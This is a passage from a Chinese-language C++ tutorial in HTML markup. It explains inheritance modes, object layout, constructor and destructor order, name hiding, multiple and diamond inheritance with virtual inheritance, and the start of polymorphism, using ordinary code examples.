cp.<span class="built_in">left</span>();</span><br><span class="line">	cp.<span class="built_in">content</span>();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">test01</span>();</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p><strong>总结：</strong></p>
<p>继承的好处：&#x3D;&#x3D;可以减少重复的代码&#x3D;&#x3D;</p>
<p>class A : public B; </p>
<p>A 类称为子类 或 派生类</p>
<p>B 类称为父类 或 基类</p>
<p><strong>派生类中的成员，包含两大部分</strong>：</p>
<p>一类是从基类继承过来的，一类是自己增加的成员。</p>
<p>从基类继承过过来的表现其共性，而新增的成员体现了其个性。</p>
<h4 id="4-6-2-继承方式"><a href="#4-6-2-继承方式" class="headerlink" title="4.6.2 继承方式"></a>4.6.2 继承方式</h4><p>继承的语法：<code>class 子类 : 继承方式  父类</code></p>
<p><strong>继承方式一共有三种：</strong></p>
<ul>
<li>公共继承</li>
<li>保护继承</li>
<li>私有继承</li>
</ul>






<p><strong>示例：</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Base1</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>: </span><br><span class="line">	<span class="type">int</span> m_A;</span><br><span class="line"><span class="keyword">protected</span>:</span><br><span class="line">	<span class="type">int</span> m_B;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">	<span class="type">int</span> m_C;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//公共继承</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Son1</span> :<span class="keyword">public</span> Base1</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="function"><span class="type">void</span> <span class="title">func</span><span class="params">()</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		m_A; <span class="comment">//可访问 public权限</span></span><br><span class="line">		m_B; <span class="comment">//可访问 protected权限</span></span><br><span class="line">		<span class="comment">//m_C; //不可访问</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">myClass</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	Son1 s1;</span><br><span class="line">	s1.m_A; <span class="comment">//其他类只能访问到公共权限</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//保护继承</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Base2</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="type">int</span> m_A;</span><br><span class="line"><span class="keyword">protected</span>:</span><br><span class="line">	<span class="type">int</span> m_B;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">	<span class="type">int</span> m_C;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Son2</span>:<span class="keyword">protected</span> Base2</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="function"><span class="type">void</span> <span class="title">func</span><span class="params">()</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		m_A; <span class="comment">//可访问 protected权限</span></span><br><span class="line">		m_B; <span class="comment">//可访问 protected权限</span></span><br><span class="line">		<span class="comment">//m_C; //不可访问</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">myClass2</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	Son2 s;</span><br><span class="line">	<span class="comment">//s.m_A; //不可访问</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//私有继承</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Base3</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="type">int</span> m_A;</span><br><span class="line"><span class="keyword">protected</span>:</span><br><span class="line">	<span class="type">int</span> m_B;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">	<span class="type">int</span> m_C;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Son3</span>:<span class="keyword">private</span> Base3</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="function"><span class="type">void</span> <span class="title">func</span><span class="params">()</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		m_A; <span class="comment">//可访问 private权限</span></span><br><span class="line">		m_B; <span class="comment">//可访问 private权限</span></span><br><span class="line">		<span class="comment">//m_C; //不可访问</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">GrandSon3</span> :<span class="keyword">public</span> Son3</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="function"><span class="type">void</span> <span class="title">func</span><span class="params">()</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="comment">//Son3是私有继承，所以继承Son3的属性在GrandSon3中都无法访问到</span></span><br><span class="line">		<span class="comment">//m_A;</span></span><br><span class="line">		<span class="comment">//m_B;</span></span><br><span class="line">		<span class="comment">//m_C;</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>









<h4 id="4-6-3-继承中的对象模型"><a href="#4-6-3-继承中的对象模型" class="headerlink" title="4.6.3 继承中的对象模型"></a>4.6.3 继承中的对象模型</h4><p><strong>问题：</strong>从父类继承过来的成员，哪些属于子类对象中？</p>
<p><strong>示例：</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Base</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="type">int</span> m_A;</span><br><span class="line"><span class="keyword">protected</span>:</span><br><span class="line">	<span class="type">int</span> m_B;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">	<span class="type">int</span> m_C; <span class="comment">//私有成员只是被隐藏了，但是还是会继承下去</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//公共继承</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Son</span> :<span class="keyword">public</span> Base</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="type">int</span> m_D;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test01</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;sizeof Son = &quot;</span> &lt;&lt; <span class="built_in">sizeof</span>(Son) &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">test01</span>();</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<p>利用工具查看：</p>




<p>打开工具窗口后，定位到当前CPP文件的盘符</p>
<p>然后输入： cl &#x2F;d1 reportSingleClassLayout查看的类名   所属文件名</p>
<p>效果如下图：</p>




<blockquote>
<p>结论： 父类中私有成员也是被子类继承下去了，只是由编译器给隐藏后访问不到</p>
</blockquote>
<h4 id="4-6-4-继承中构造和析构顺序"><a href="#4-6-4-继承中构造和析构顺序" class="headerlink" title="4.6.4 继承中构造和析构顺序"></a>4.6.4 继承中构造和析构顺序</h4><p>子类继承父类后，当创建子类对象，也会调用父类的构造函数</p>
<p>问题：父类和子类的构造和析构顺序是谁先谁后？</p>
<p><strong>示例：</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Base</span> </span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">Base</span>()</span><br><span class="line">	&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;Base构造函数!&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">	~<span class="built_in">Base</span>()</span><br><span class="line">	&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;Base析构函数!&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Son</span> : <span class="keyword">public</span> Base</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">Son</span>()</span><br><span class="line">	&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;Son构造函数!&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">	~<span class="built_in">Son</span>()</span><br><span class="line">	&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;Son析构函数!&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test01</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">//继承中 先调用父类构造函数，再调用子类构造函数，析构顺序与构造相反</span></span><br><span class="line">	Son s;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">test01</span>();</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<blockquote>
<p>总结：继承中 先调用父类构造函数，再调用子类构造函数，析构顺序与构造相反</p>
</blockquote>
<h4 id="4-6-5-继承同名成员处理方式"><a href="#4-6-5-继承同名成员处理方式" class="headerlink" title="4.6.5 继承同名成员处理方式"></a>4.6.5 继承同名成员处理方式</h4><p>问题：当子类与父类出现同名的成员，如何通过子类对象，访问到子类或父类中同名的数据呢？</p>
<ul>
<li>访问子类同名成员   直接访问即可</li>
<li>访问父类同名成员   需要加作用域</li>
</ul>
<p><strong>示例：</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Base</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">Base</span>()</span><br><span class="line">	&#123;</span><br><span class="line">		m_A = <span class="number">100</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="type">void</span> <span class="title">func</span><span class="params">()</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;Base - func()调用&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="type">void</span> <span class="title">func</span><span class="params">(<span class="type">int</span> a)</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;Base - func(int a)调用&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="type">int</span> m_A;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Son</span> : <span class="keyword">public</span> Base &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">Son</span>()</span><br><span class="line">	&#123;</span><br><span class="line">		m_A = <span class="number">200</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//当子类与父类拥有同名的成员函数，子类会隐藏父类中所有版本的同名成员函数</span></span><br><span class="line">	<span class="comment">//如果想访问父类中被隐藏的同名成员函数，需要加父类的作用域</span></span><br><span class="line">	<span class="function"><span class="type">void</span> <span class="title">func</span><span class="params">()</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;Son - func()调用&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="type">int</span> m_A;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test01</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	Son s;</span><br><span class="line"></span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;Son下的m_A = &quot;</span> &lt;&lt; s.m_A &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;Base下的m_A = &quot;</span> &lt;&lt; s.Base::m_A &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">	s.<span class="built_in">func</span>();</span><br><span class="line">	s.Base::<span class="built_in">func</span>();</span><br><span class="line">	s.Base::<span class="built_in">func</span>(<span class="number">10</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">test01</span>();</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> EXIT_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>总结：</p>
<ol>
<li>子类对象可以直接访问到子类中同名成员</li>
<li>子类对象加作用域可以访问到父类同名成员</li>
<li>当子类与父类拥有同名的成员函数，子类会隐藏父类中同名成员函数，加作用域可以访问到父类中同名函数</li>
</ol>
<h4 id="4-6-6-继承同名静态成员处理方式"><a href="#4-6-6-继承同名静态成员处理方式" class="headerlink" title="4.6.6 继承同名静态成员处理方式"></a>4.6.6 继承同名静态成员处理方式</h4><p>问题：继承中同名的静态成员在子类对象上如何进行访问？</p>
<p>静态成员和非静态成员出现同名，处理方式一致</p>
<ul>
<li>访问子类同名成员   直接访问即可</li>
<li>访问父类同名成员   需要加作用域</li>
</ul>
<p><strong>示例：</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Base</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">func</span><span class="params">()</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;Base - static void func()&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">func</span><span class="params">(<span class="type">int</span> a)</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;Base - static void func(int a)&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="type">static</span> <span class="type">int</span> m_A;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> Base::m_A = <span class="number">100</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Son</span> : <span class="keyword">public</span> Base &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">func</span><span class="params">()</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;Son - static void func()&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="type">static</span> <span class="type">int</span> m_A;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> Son::m_A = <span class="number">200</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//同名成员属性</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test01</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">//通过对象访问</span></span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;通过对象访问： &quot;</span> &lt;&lt; endl;</span><br><span class="line">	Son s;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;Son  下 m_A = &quot;</span> &lt;&lt; s.m_A &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;Base 下 m_A = &quot;</span> &lt;&lt; s.Base::m_A &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//通过类名访问</span></span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;通过类名访问： &quot;</span> &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;Son  下 m_A = &quot;</span> &lt;&lt; Son::m_A &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;Base 下 m_A = &quot;</span> &lt;&lt; Son::Base::m_A &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//同名成员函数</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test02</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">//通过对象访问</span></span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;通过对象访问： &quot;</span> &lt;&lt; endl;</span><br><span class="line">	Son s;</span><br><span class="line">	s.<span class="built_in">func</span>();</span><br><span class="line">	s.Base::<span class="built_in">func</span>();</span><br><span class="line"></span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;通过类名访问： &quot;</span> &lt;&lt; endl;</span><br><span class="line">	Son::<span class="built_in">func</span>();</span><br><span class="line">	Son::Base::<span class="built_in">func</span>();</span><br><span class="line">	<span class="comment">//出现同名，子类会隐藏掉父类中所有同名成员函数，需要加作作用域访问</span></span><br><span class="line">	Son::Base::<span class="built_in">func</span>(<span class="number">100</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//test01();</span></span><br><span class="line">	<span class="built_in">test02</span>();</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>总结：同名静态成员处理方式和非静态处理方式一样，只不过有两种访问的方式（通过对象 和 通过类名）</p>
</blockquote>
<h4 id="4-6-7-多继承语法"><a href="#4-6-7-多继承语法" class="headerlink" title="4.6.7 多继承语法"></a>4.6.7 多继承语法</h4><p>C++允许<strong>一个类继承多个类</strong></p>
<p>语法：<code> class 子类 ：继承方式 父类1 ， 继承方式 父类2...</code></p>
<p>多继承可能会引发父类中有同名成员出现，需要加作用域区分</p>
<p><strong>C++实际开发中不建议用多继承</strong></p>
<p><strong>示例：</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Base1</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">Base1</span>()</span><br><span class="line">	&#123;</span><br><span class="line">		m_A = <span class="number">100</span>;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="type">int</span> m_A;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Base2</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">Base2</span>()</span><br><span class="line">	&#123;</span><br><span class="line">		m_A = <span class="number">200</span>;  <span class="comment">//开始是m_B 不会出问题，但是改为mA就会出现不明确</span></span><br><span class="line">	&#125;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="type">int</span> m_A;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//语法：class 子类：继承方式 父类1 ，继承方式 父类2 </span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Son</span> : <span class="keyword">public</span> Base2, <span class="keyword">public</span> Base1 </span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">Son</span>()</span><br><span class="line">	&#123;</span><br><span class="line">		m_C = <span class="number">300</span>;</span><br><span class="line">		m_D = <span class="number">400</span>;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="type">int</span> m_C;</span><br><span class="line">	<span class="type">int</span> m_D;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//多继承容易产生成员同名的情况</span></span><br><span class="line"><span class="comment">//通过使用类名作用域可以区分调用哪一个基类的成员</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test01</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	Son s;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;sizeof Son = &quot;</span> &lt;&lt; <span class="built_in">sizeof</span>(s) &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; s.Base1::m_A &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; s.Base2::m_A &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">test01</span>();</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<blockquote>
<p>总结： 多继承中如果父类中出现了同名情况，子类使用时候要加作用域</p>
</blockquote>
<h4 id="4-6-8-菱形继承"><a href="#4-6-8-菱形继承" class="headerlink" title="4.6.8 菱形继承"></a>4.6.8 菱形继承</h4><p><strong>菱形继承概念：</strong></p>
<p>​	两个派生类继承同一个基类</p>
<p>​	又有某个类同时继承者两个派生类</p>
<p>​	这种继承被称为菱形继承，或者钻石继承</p>
<p><strong>典型的菱形继承案例：</strong></p>




<p><strong>菱形继承问题：</strong></p>
<ol>
<li><pre><code>羊继承了动物的数据，驼同样继承了动物的数据，当草泥马使用数据时，就会产生二义性。
</code></pre>
</li>
<li><p>草泥马继承自动物的数据继承了两份，其实我们应该清楚，这份数据我们只需要一份就可以。</p>
</li>
</ol>
<p><strong>示例：</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Animal</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="type">int</span> m_Age;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//继承前加virtual关键字后，变为虚继承</span></span><br><span class="line"><span class="comment">//此时公共的父类Animal称为虚基类</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Sheep</span> : <span class="keyword">virtual</span> <span class="keyword">public</span> Animal &#123;&#125;;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Tuo</span>   : <span class="keyword">virtual</span> <span class="keyword">public</span> Animal &#123;&#125;;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SheepTuo</span> : <span class="keyword">public</span> Sheep, <span class="keyword">public</span> Tuo &#123;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test01</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	SheepTuo st;</span><br><span class="line">	st.Sheep::m_Age = <span class="number">100</span>;</span><br><span class="line">	st.Tuo::m_Age = <span class="number">200</span>;</span><br><span class="line"></span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;st.Sheep::m_Age = &quot;</span> &lt;&lt; st.Sheep::m_Age &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;st.Tuo::m_Age = &quot;</span> &lt;&lt;  st.Tuo::m_Age &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;st.m_Age = &quot;</span> &lt;&lt; st.m_Age &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">test01</span>();</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>总结：</p>
<ul>
<li>菱形继承带来的主要问题是子类继承两份相同的数据，导致资源浪费以及毫无意义</li>
<li>利用虚继承可以解决菱形继承问题</li>
</ul>
<h3 id="4-7-多态"><a href="#4-7-多态" class="headerlink" title="4.7  多态"></a>4.7  多态</h3><h4 id="4-7-1-多态的基本概念"><a href="#4-7-1-多态的基本概念" class="headerlink" title="4.7.1 多态的基本概念"></a>4.7.1 多态的基本概念</h4><p><strong>多态是C++面向对象三大特性之一</strong></p>
<p>多态分为两类</p>
<ul>
<li>静态多态: 函数重载 和 运算符重载属于静态多态，复用函数名</li>
<li>动态多态: 派生类和虚函数实现运行时多态</li>
</ul>
<p>静态多态和动态多态区别：</p>
<ul>
<li>静态多态的函数地址早绑定  -  编译阶段确定函数地址</li>
<li>动态多态的函数地址晚绑定  -  运行阶段确定函数地址</li>
</ul>
<p>下面通过案例进行讲解多态</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Animal</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="comment">//Speak函数就是虚函数</span></span><br><span class="line">	<span class="comment">//函数前面加上virtual关键字，变成虚函数，那么编译器在编译的时候就不能确定函数调用了。</span></span><br><span class="line">	<span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">speak</span><span class="params">()</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;动物在说话&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Cat</span> :<span class="keyword">public</span> Animal</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="function"><span class="type">void</span> <span class="title">speak</span><span class="params">()</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;小猫在说话&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Dog</span> :<span class="keyword">public</span> Animal</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="type">void</span> <span class="title">speak</span><span class="params">()</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;小狗在说话&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">//我们希望传入什么对象，那么就调用什么对象的函数</span></span><br><span class="line"><span class="comment">//如果函数地址在编译阶段就能确定，那么静态联编</span></span><br><span class="line"><span class="comment">//如果函数地址在运行阶段才能确定，就是动态联编</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">DoSpeak</span><span class="params">(Animal &amp; animal)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	animal.<span class="built_in">speak</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//多态满足条件： </span></span><br><span class="line"><span class="comment">//1、有继承关系</span></span><br><span class="line"><span class="comment">//2、子类重写父类中的虚函数</span></span><br><span class="line"><span class="comment">//多态使用：</span></span><br><span class="line"><span class="comment">//父类指针或引用指向子类对象</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test01</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	Cat cat;</span><br><span class="line">	<span class="built_in">DoSpeak</span>(cat);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	Dog dog;</span><br><span class="line">	<span 